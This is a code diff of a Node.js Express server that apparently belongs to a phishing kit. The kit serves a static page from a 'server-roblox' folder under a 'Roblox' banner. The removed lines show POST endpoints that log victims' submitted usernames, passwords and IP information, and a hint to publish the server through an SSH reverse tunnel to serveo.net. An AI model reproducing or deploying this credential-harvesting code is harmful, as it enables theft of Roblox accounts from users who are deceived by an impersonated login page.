@@ -1,6 +1,6 @@
 const express = require('express');
 const bodyParser = require('body-parser');
-const { exec, execSync } = require('child_process');
+const { exec } = require('child_process');
 const path = require('path');
 const fs = require('fs');
 const CFonts = require('cfonts');
@@ -10,18 +10,6 @@ const port = 8080;
 app.use(bodyParser.json());
 
 app.use(express.static(path.join(__dirname, 'server-roblox')));
-
-app.post('/server-roblox', (req, res) => {
-    const { idusername, idpass } = req.body;
-    console.log(`\nLogin Info: {\n  Username: ${idusername},\n  Password: ${idpass}\n}`);
-    res.sendStatus(200);
-});
-
-app.post('/ipinfo', (req, res) => {
-    const ipInfo = req.body;
-    console.log(`\nIP Info:`, ipInfo);
-    res.sendStatus(200);
-});
 
 CFonts.say('Roblox', {
     font: 'pallet',              
@@ -37,5 +25,4 @@ CFonts.say('Roblox', {
 app.listen(port, () => {
     console.log('Server connected!');
     console.log(`Server is running on http://localhost:${port}`);
-    console.log(`command ssh -R 80:localhost:${port} serveo.net`)
 });
